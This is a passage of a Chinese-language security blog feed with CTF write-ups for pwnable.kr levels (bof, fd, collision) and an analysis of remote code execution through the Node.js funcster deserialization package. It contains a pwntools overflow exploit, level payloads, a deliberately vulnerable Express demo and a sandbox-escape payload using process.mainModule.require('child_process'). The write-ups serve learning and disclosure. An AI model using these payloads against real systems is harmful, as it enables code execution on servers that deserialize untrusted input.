0xffffd4680xffffd468</span><br></pre></td></tr></table></figure><p>得到偏移量为<code>0xffffd468 + 0x8 - 0xffffd43c=52</code>, 利用<code>pwntools</code>工具包编写exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./bof')</span></span><br><span class="line">p = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">52</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print p.recvline()</span></span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行getshell获得flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./go.py                                                                                                                                                                                                 127 ↵</span></span><br><span class="line">[+] Opening connection to pwnable.kr on port 9000: Done</span><br><span class="line">[DEBUG] Sent 0x39 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class="line">    *</span><br><span class="line">    00000030  41 41 41 41  be ba fe ca  0a                        │AAAA│····│·│</span><br><span class="line">    00000039</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    <span class="string">'cat flag\n'</span></span><br><span class="line">[DEBUG] Received 0x20 bytes:</span><br><span class="line">    <span class="string">'daddy, I just pwned a buFFer :)\n'</span></span><br><span class="line">daddy, I just pwned a buFFer :)</span><br><span class="line">$</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天开刷第三道题bof, 遇到个小坑就是题目有buffer, 导致好久我都以为题目炸了hhh. 虽然还是很简单的入门题, 但是也做了挺久的, 哎tcl.&lt;/p&gt;
&lt;h1 id=&quot;bof&quot;&gt;&lt;a href=&quot;#bof&quot; class=&quot;headerlink&quot; title=&quot;bo
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://lxzmads.github.io/tags/CTF/"/>
    
      <category term="PWN" scheme="http://lxzmads.github.io/tags/PWN/"/>
    
      <category term="PWNABLE.KR" scheme="http://lxzmads.github.io/tags/PWNABLE-KR/"/>
    
  </entry>
  
  <entry>
    <title>从零开刷PWNABLE.KR系列-fd、collision</title>
    <link href="http://lxzmads.github.io/2019/02/20/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%88%B7PWNABLE.KR%E7%B3%BB%E5%88%97-fd%E3%80%81collision/"/>
    <id>http://lxzmads.github.io/2019/02/20/从零开刷PWNABLE.KR系列-fd、collision/</id>
    <published>2019-02-19T16:00:00.000Z</published>
    <updated>2019-02-25T11:26:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>从零开学PWN，希望自己坚持下去吧！</p><h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p>Mommy! what is a file descriptor in Linux?</p><ul><li>try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:<br><a href="https://youtu.be/971eZhMHQQw" target="_blank" rel="noopener">https://youtu.be/971eZhMHQQw</a></li></ul><p>ssh <a href="mailto:fd@pwnable.kr" target="_blank" rel="noopener">fd@pwnable.kr</a> -p2222 (pw:guest)</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>登录上去发现有三个文件，一个源代码，一个编译之后的elf，还有个flag文件，查看源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑很简单，需要将buf字符串数组的内容置为”LETMEWIN\n”。 其中改变buf数组的地方只有一个<code>read</code>函数， 从fd变量中读入最多32字节到buf。fd变量是个整形变量，是从我们给elf喂的第一个参数转换成整形并和0x1234做减法得到。我们查看<code>read</code>函数原型：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t <span class="built_in">read</span>(int fd, void *buf, size_t count);</span><br></pre></td></tr></table></figure><p>发现第一个参数叫做<code>file descriptor</code>,Linux中有“Everything is file”的思想，每个打开的文件都会有一个叫做“file descriptor”的东西，其实就是一个数字。其中0、1和2分别分配给了标准输入、标准输出和标准错误(即/dev/stdin、/dev/stdout、/dev/stderr)。</p><p>于是思路就是让<code>fd</code>的值置为0, 就可以将标准输入的内容填入<code>buf</code>数组, 满足条件得到flag. Payload如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"LETMEWIN"</span> | ./fd 4660</span><br><span class="line"></span><br><span class="line"><span class="comment">#fd@ubuntu:~$ echo "LETMEWIN" | ./fd 4660</span></span><br><span class="line"><span class="comment">#good job :)</span></span><br><span class="line"><span class="comment">#mommy! I think I know what a file descriptor is!!</span></span><br></pre></td></tr></table></figure><h1 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h1><p>Daddy told me about cool MD5 hash collision today.<br>I wanna do something like that too!</p><p>ssh <a href="mailto:col@pwnable.kr" target="_blank" rel="noopener">col@pwnable.kr</a> -p2222 (pw:guest)</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>查看源码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是一个很简单的哈希函数, 我们要做的就是反推哈希值, 得到一个满足条件的原值即可. 题目中哈希函数做的就是将一个20字节的字符串强制类型转换为5个整形, x86中一个整形4字节刚好能够转换. 于是我们的任务就转化为弄五个整形加起来凑成<code>0x21DD09EC</code>, 然后将五个整数转化为字符串连起来即可. 这里还有一点需要注意的就是端序问题, 字符串在内存中是顺序摆放(即按字节从低地址到高地址), 而整数是小端序存放的(即低位在低地址, 高位在高地址). 由于涉及到字符较少, 可以手动逆序. Payload如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">"\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06"</span> | xargs ./col</span><br><span class="line"></span><br><span class="line"><span class="comment"># daddy! I just managed to create a hash collision :)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;从零开学PWN，希望自己坚持下去吧！&lt;/p&gt;
&lt;h1 id=&quot;fd&quot;&gt;&lt;a href=&quot;#fd&quot; class=&quot;headerlink&quot; title=&quot;fd&quot;&gt;&lt;/a&gt;fd&lt;/h1&gt;&lt;p&gt;Mommy! what is a file descriptor in Linux?&lt;/
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://lxzmads.github.io/tags/CTF/"/>
    
      <category term="PWN" scheme="http://lxzmads.github.io/tags/PWN/"/>
    
      <category term="PWNABLE.KR" scheme="http://lxzmads.github.io/tags/PWNABLE-KR/"/>
    
  </entry>
  
  <entry>
    <title>Nodejs反序列化包funcster RCE分析</title>
    <link href="http://lxzmads.github.io/2018/12/09/Nodejs%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8C%85funcster%20RCE%E5%88%86%E6%9E%90/"/>
    <id>http://lxzmads.github.io/2018/12/09/Nodejs反序列化包funcster RCE分析/</id>
    <published>2018-12-08T16:00:00.000Z</published>
    <updated>2019-08-02T14:13:08.304Z</updated>
    
    <content type="html"><![CDATA[<p>最近的一次CTF中遇到了一题nodejs反序列化的题, 题目直接提示反序列化, 然而之前并没有接触过这一块的东西, 结果就是知道思路但是不知如何利用. 比赛结束后我就学习了一下这一块的知识, 网上分析的比较多的都是CVE-2017-5941, 这个CVE主要是因为<code>node-serialize</code>这个包在反序列化对象中的函数时直接在<a href="https://github.com/luin/serialize/blob/f9051f4104a3cd873f29b8815796e9f5d065c1a9/lib/serialize.js#L76" target="_blank" rel="noopener">源代码</a>中调用了<code>eval</code>. 如下： </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">'string'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(obj[key].indexOf(FUNCFLAG) === <span class="number">0</span>) &#123;</span><br><span class="line">    obj[key] = <span class="built_in">eval</span>(<span class="string">'('</span> + obj[key].substring(FUNCFLAG.length) + <span class="string">')'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chybeta师傅<a href="https://chybeta.github.io/2017/11/01/Node-js%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9ACVE-2017-5941/" target="_blank" rel="noopener">分析</a>的已经很到位了, 大家可以去看看. (记得回来</p><p>类似的还有<code>serialize-to-js</code>这个包在反序列化时调用了<code>new Function</code>然后放进了<code>safeEval</code>运行, 和上面的效果类似. <a href="https://github.com/commenthol/serialize-to-js/blob/058589781ec99ed0e8a1f2647665b31823ea9bd7/lib/deserialize.js#L33" target="_blank" rel="noopener">源码</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deserialize</span> (<span class="params">str, context</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (context === <span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'"use strict"; return '</span> + str))() <span class="comment">// unsafe execution</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> saferEval(str, context)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Funcster源码分析及吐槽"><a href="#Funcster源码分析及吐槽" class="headerlink" title="Funcster源码分析及吐槽"></a>Funcster源码分析及吐槽</h1><p>今天我想分析的不是以上两个包, 而是在看<a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/" target="_blank" rel="noopener">一篇博客</a>中提到的<code>funcster</code>这个包. 它是nodejs的一个专门用于序列化函数的一个包, 采用了将代码放到一个新的文件(module)的做法来反序列化, 并且在反序列化的时候用了<code>vm</code>这个库将反序列化后的代码放在一个沙箱中运行, 反序列化部分<a href="https://github.com/jeffomatic/funcster/blob/c589bdf3569b9bd15e485ec70604d80fc912d890/js/lib/funcster.js#L83" target="_blank" rel="noopener">源码</a>如下: </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">_generateModuleScript: <span class="function"><span class="keyword">function</span>(<span class="params">serializedFunctions</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> body, entries, name;</span><br><span class="line">    entries = [];</span><br><span class="line">    <span class="keyword">for</span> (name <span class="keyword">in</span> serializedFunctions) &#123;</span><br><span class="line">    body = serializedFunctions[name];</span><br><span class="line">    entries.push(<span class="string">""</span> + (<span class="built_in">JSON</span>.stringify(name)) + <span class="string">": "</span> + body);</span><br><span class="line">    &#125;</span><br><span class="line">    entries = entries.join(<span class="string">','</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"module.exports=(function(module,exports)&#123;return&#123;"</span> + entries + <span class="string">"&#125;;&#125;)();"</span>;</span><br><span class="line">&#125;,</span><br><span class="line">_generateModule: <span class="function"><span class="keyword">function</span>(<span class="params">script, opts</span>) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    vm.createScript(script, opts.filename).runInNewContext(sandbox);</span><br><span class="line">    <span class="keyword">return</span> sandbox.module.exports;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这种做法在一定程度上阻止了反序列化后的代码访问到一些危险的函数如<code>require</code>、<code>child_process</code>, 甚至在seebug中的<a href="https://paper.seebug.org/213/" target="_blank" rel="noopener">一篇翻译</a>的作者补充内容中认为这是比较好的做法:</p><p><img src="https://raw.githubusercontent.com/lxzmads/picbed/master/5c0c9945ee40a.png" alt="5c0c9945ee40a.png"></p><blockquote><p>顺便说一句, 这篇翻译强调了IIFE的作用, 其实祸源是<code>eval</code>, 与JS的IIFE特性关系并不是那么紧密. 这在<a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" target="_blank" rel="noopener">原post</a>的评论中有人指出, 作者也回应了, 翻译难道不看评论的么 = . =</p></blockquote><p>然而这种方法也并不是那么安全, 博客中并提出了一种绕过方法. (其实是一种沙箱逃逸了)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var pr = this.constructor.constructor(&quot;console.log(1111)&quot;)();</span><br></pre></td></tr></table></figure><p>即通过沙箱内对象的<code>this</code>指针获取对象<code>constructor</code>, 再通过对象<code>constructor</code>的<code>constructor</code>获取<code>Function</code>对象, 这样我们就可以在<code>global</code>的环境下运行代码了. 这一部分在文中只是稍微提了下, 我一开始看是觉得很神奇但是不理解的, 于是整理了一下这部分内容. 要想理解这部分, 首先要复习下<code>Javascript</code>的神奇的继承机制——原型链, 其实通过一张图就可以明白:</p><p><img src="https://raw.githubusercontent.com/lxzmads/picbed/master/5c0c9bfc16883.png" alt="5c0c9bfc16883.png"></p><p>需要补充的是作为构造器(constructor)的函数对象的<code>constructor</code>都是一个叫做<code>Function</code>的对象, 我们可以通过<code>new Function ([arg1[, arg2[, ...argN]],] functionBody)</code>的形式创建任何函数, 其中前面的可选的函数参数, 最后一项是函数代码. <code>Function</code>对象中的函数是运行在<code>global</code>的<code>scope</code>中的, 这与<code>eval</code>函数不同. 若不明白JS的<code>scope</code>, 推荐看<a href="https://community.risingstack.com/explaining-javascript-closure-scope-chain-examples/" target="_blank" rel="noopener">这篇</a>.所以前面通过两次取<code>constructor</code>的操作就获得了<code>Function</code>对象. 再通过<code>IIFE</code>就可以在<code>global</code>的环境下执行我们的代码.</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>我做了个demo来验证我的想法, 编写一个服务端脚本如下(由CVE-2017-5941作者提供的修改而来):</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">'cookie-parser'</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">escape</span> = <span class="built_in">require</span>(<span class="string">'escape-html'</span>);</span><br><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'funcster'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line">app.use(cookieParser())</span><br><span class="line"> </span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (req.cookies.profile) &#123;</span><br><span class="line">            <span class="keyword">var</span> str = <span class="keyword">new</span> Buffer(req.cookies.profile, <span class="string">'base64'</span>).toString();</span><br><span class="line">            <span class="keyword">var</span> strObj = <span class="built_in">JSON</span>.parse(str);</span><br><span class="line">            <span class="keyword">var</span> func = serialize.deepDeserialize(strObj);</span><br><span class="line">            <span class="keyword">if</span> (func) &#123;</span><br><span class="line">                     res.send(func());</span><br><span class="line">                   &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   res.cookie(<span class="string">'profile'</span>, <span class="string">"eyBfX2pzX2Z1bmN0aW9uOiAnZnVuY3Rpb24oKXtyZXR1cm4iaGVsbG8gc3RyYW5nZXIiO30nIH0="</span>, &#123;</span><br><span class="line">                              maxAge: <span class="number">900000</span>,</span><br><span class="line">                              httpOnly: <span class="literal">true</span></span><br><span class="line">                            &#125;);</span><br><span class="line">               &#125;</span><br><span class="line">     res.send(<span class="string">"Hello World"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>当然这个app很蠢, 直接执行用户提供的函数, 这里只是为了演示. (有时候实际情况也差不多其实). 结合上面的分析, 我提供了如下payload经过base64以及urlencode之后在<code>cookie</code>的<code>profile</code>中发送给服务端, payload是个RCE的函数, 首先导入<code>child_process</code>包, 然后利用这个包执行了<code>bash</code>命令<code>ls</code>, 理论上可以列出当前目录的文件名.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"__js_function"</span>:<span class="string">"function mads()&#123;var p = this.constructor.constructor(\"return require(\\\"child_process\\\")\")();var con = this.constructor.constructor(\"return console\")(); p.exec(\"ls\", function(err, stdout, stderr)&#123;con.log(stdout);&#125;); &#125;()"</span>&#125;</span><br></pre></td></tr></table></figure><p>然后正当我兴致勃勃准备享受胜利果实时, 事情却意外地失败了. 在服务端的控制台看到了如下输出,</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">undefined:3</span><br><span class="line"><span class="built_in">return</span> require(<span class="string">"child_process"</span>)</span><br><span class="line">^</span><br><span class="line"></span><br><span class="line">ReferenceError: require is not defined</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>require</code>未定义??? 去google了一圈发现只有一个问题是关于这个的, 而且原因是他<code>require</code>拼错了QAQ. 我一个一个字母检查之后确认没拼错, 那么是怎么回事呢? </p><p>查了一下nodejs的文档有了新发现,原来nodejs是用一个叫做<code>module</code>的对象组织分离在不同文件的代码的, 每个文件都是一个<code>module</code>对象, 文件中的代码载入之前会用一层<code>wrapper</code>包起来, 是利用js匿名闭包将代码组织到一个<code>scope</code>里面.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">exports, require, module, __filename, __dirname</span>) </span>&#123;</span><br><span class="line"><span class="comment">// Module code actually lives in here</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>并且在文档中也说到<code>__dirname</code>、<code>__filename</code>、<code>exports</code>、<code>module</code>、<code>require()</code>是在<code>module</code>的<code>scope</code>中, 而没有在<code>global</code>的<code>scope</code>中. </p><blockquote><h1 id="Global-Objects"><a href="#Global-Objects" class="headerlink" title="Global Objects"></a>Global Objects</h1><p>These objects are available in all modules. The following variables may appear to be global but are not. They exist only in the scope of modules, see the module system documentation:</p><ul><li>__dirname</li><li>__filename</li><li>exports</li><li>module</li><li>require() </li></ul></blockquote><p>终于搞明白为什么我们在<code>Function</code>对象的参数中运行的代码找不到<code>require</code>了! 因为<code>Function</code>对象的参数中代码是运行在<code>global</code>的<code>scope</code>中的, 而<code>require</code>是在<code>module scope</code>中. 因为nodejs是基于v8开发, 所以<code>module scope</code>必然是在<code>global scope</code>里面, 在比较大的<code>scope</code>中引用比较小的<code>scope</code>的属性方法, 是要先导入的.</p><p>这时我想到, 那么就可以先在<code>Function</code>对象参数中的代码中导入<code>module</code>不就行了嘛！然而比较矛盾的事发生了, 我要先导入<code>module</code>以使用<code>require</code>方法, 然而我要导入, 就要用到<code>require</code>方法！ 这可怎么办??</p><p>无助(无聊)的时候翻阅文档总是对的. 每个nodejs进程都会有一个<code>process</code>对象在<code>global scope</code>中, 这个对象是进程启动时就载入内存的, 所以一直可以访问. 在<code>process</code>中有了新发现:</p><blockquote><h1 id="process-mainModule"><a href="#process-mainModule" class="headerlink" title="process.mainModule"></a>process.mainModule</h1><p>Added in: v0.1.17</p><p>&lt;Object><br><strong>The <code>process.mainModule</code> property provides an alternative way of retrieving <code>require.main</code></strong>. The difference is that if the main module changes at runtime, <code>require.main</code> may still refer to the original main module in modules that were required before the change occurred. Generally, it’s safe to assume that the two refer to the same module.</p></blockquote><p>nodejs在<code>process</code>对象中提供了一种额外的途径访问<code>require.main</code>, 深入文档可以发现<code>require.main</code>是某个文件所在<code>module</code>的引用, 也就是<code>require.main == module</code></p><blockquote><h1 id="Accessing-the-main-module"><a href="#Accessing-the-main-module" class="headerlink" title="Accessing the main module"></a>Accessing the main module</h1><p>When a file is run directly from Node.js, <code>require.main</code> is set to its <code>module</code>. That means that it is possible to determine whether a file has been run directly by testing <code>require.main === module</code>.</p></blockquote><p>也就是说我们可以在<code>global scope</code>下获得一个存在于内存中但是无法直接引用的<code>main module</code>对象, 从而利用<code>module scope</code>里面的所有nodejs方法来RCE, bingo!</p><p>整理了一下各个<code>scope</code>关系图大概如下(画图板勿喷):</p><p><img src="https://raw.githubusercontent.com/lxzmads/picbed/master/5c0ca9480c250.png" alt="5c0ca9480c250.png"></p><p>我修改payload如下:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"__js_function"</span>:<span class="string">"function mads()&#123;var p = this.constructor.constructor(\"return process.mainModule.require(\\\"child_process\\\")\")();var con = this.constructor.constructor(\"return console\")(); p.exec(\"cat /flag\", function(err, stdout, stderr)&#123;con.log(stdout);&#125;); &#125;()"</span>&#125;</span><br></pre></td></tr></table></figure><p>在后台成功的执行了<code>cat /flag</code>命令 :)</p><p><img src="https://raw.githubusercontent.com/lxzmads/picbed/master/5c0caa0584c3a.png" alt="5c0caa0584c3a.png"></p><h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>上面提到的三个包的这些安全问题都是17年被发现的, 然而我复现的时间是快2019年元旦了, 那些代码还是和原来一样的, 只不过加上了一些<code>WARN</code>. </p><blockquote><p><strong><em>Security warning</em></strong><br>deepDeserialize performs code evaluation on strings, and is susceptible to arbitrary code injection. Please make sure that root comes from a trusted source before using it.</p></blockquote><p>这就说明要求程序猿在编写后端代码时要有足够的安全意识, 不能接收不受信任的用户输入作为反序列化参数, 但是有安全意识的程序猿又有多少呢!</p>]]></content>
    
    <summary type="html">
    
      
      
